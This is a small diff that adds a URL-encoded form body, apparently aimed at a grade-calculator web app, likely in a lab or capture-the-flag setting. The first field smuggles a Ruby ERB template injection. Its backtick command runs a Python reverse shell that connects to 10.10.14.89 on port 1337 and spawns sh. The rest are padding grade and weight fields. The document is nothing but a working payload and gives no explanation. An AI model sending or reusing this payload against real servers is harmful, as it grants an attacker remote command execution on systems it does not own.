@@ -1,0 +1,2 @@
+
+test%0A<%25%3d+`export RHOST="10.10.14.89";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`+%25>&grade1=55&weight1=60&category2=TEST&grade2=55&weight2=10&category3=TEST&grade3=55&weight3=10&category4=TEST&grade4=55&weight4=10&category5=TEST&grade5=55&weight5=10
